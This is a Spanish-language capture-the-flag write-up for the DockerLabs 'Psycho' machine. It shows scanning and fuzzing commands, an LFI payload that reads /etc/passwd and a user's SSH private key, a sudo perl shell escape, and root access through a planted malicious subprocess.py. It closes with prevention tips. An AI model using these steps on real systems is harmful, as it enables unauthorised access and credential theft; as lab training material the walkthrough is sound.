
# Máquina Psycho

![inicio](https://github.com/xavis3c/Writeups-dockerlabs/blob/Recursos/inicioPsycho.png)

## Escaneo de la máquina

Comenzamos con un escaneo de puertos utilizando `nmap`:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -sV -vvv -n -Pn 172.17.0.2
```

Este escaneo nos revela que los puertos 22 (SSH) y 80 (HTTP) están abiertos.

## Enumeración del sitio web

Al acceder al puerto 80 en el navegador, encontramos una página aparentemente creada por `TLuisillo_o`, con un error en la parte inferior que dice `[!]ERROR[!]`. Esto podría indicar una vulnerabilidad.

Ejecutamos `gobuster` para buscar directorios y archivos ocultos:

```bash
gobuster dir -u "http://172.17.0.2/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,py,bak,php.bak,html
```

Se encuentran dos rutas interesantes:

- `/assets` → Contiene una imagen, pero nada útil.
- `/index.php` → Parece vacío, pero podría estar vulnerable a **LFI (Local File Inclusion)**.

Probamos con `wfuzz`:

```bash
wfuzz -c -u http://172.17.0.2/index.php?FUZZ=/etc/passwd -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hh 2596
```

El parámetro `secret` devuelve contenido, así que probamos:

```bash
http://172.17.0.2/index.php?secret=/etc/passwd
```

¡Tenemos un LFI! Vemos los usuarios `luisillo` y `vaxei`.

## Explotando LFI para obtener SSH

Buscamos claves privadas:

```bash
http://172.17.0.2/index.php?secret=/home/vaxei/.ssh/id_rsa
```

Obtenemos la clave privada SSH de `vaxei`. La guardamos y le damos permisos adecuados:

```bash
nano id_rsa
chmod 600 id_rsa
```

Nos conectamos por SSH:

```bash
ssh -i id_rsa vaxei@172.17.0.2
```

## Escalada de privilegios a `luisillo`

Ejecutamos `sudo -l` y vemos que podemos ejecutar `perl` como `luisillo`.

Ejecutamos:

```bash
sudo -u luisillo perl -e 'exec "/bin/sh";'
```

Luego, para hacer la shell interactiva:

```bash
bash -p
```

## Escalada de privilegios a `root`

Ejecutamos `sudo -l` nuevamente y vemos que podemos ejecutar `python3`.

En `/opt/` encontramos `paw.py`, que importa `subprocess`.

Creamos un archivo malicioso `subprocess.py`:

```bash
nano subprocess.py
```

Colocamos dentro:

```python
import os
os.system("bash -p")
```

Ejecutamos `paw.py` con sudo:

```bash
sudo python3 /opt/paw.py
```

Ahora somos `root`. Verificamos con:

```bash
whoami
```

### ¿Cómo funcionó este exploit?

Cuando `paw.py` ejecuta:

```python
import subprocess
```

Python busca `subprocess.py` en el directorio actual antes que en el sistema. Como creamos nuestro propio `subprocess.py`, se ejecutó nuestro código en vez del original, dándonos una shell de root.

### ¿Cómo prevenirlo?

- No usar `sudo python3 script.py` en directorios no confiables.
- Especificar rutas absolutas en imports.
- Verificar `PYTHONPATH`.
- Usar `importlib.util` para evitar imports no deseados.

---

⚠ **Este material es solo para aprendizaje y CTFs legales. No lo uses en sistemas sin autorización.**
---

**En mi pagina web (Blog) subo las maquinas más a detalle, normalmento lo hago primero alla por quien guste puede checarlo de aquel lado tambien.** 

https://elyoxsecurity.com/category/maquinas/
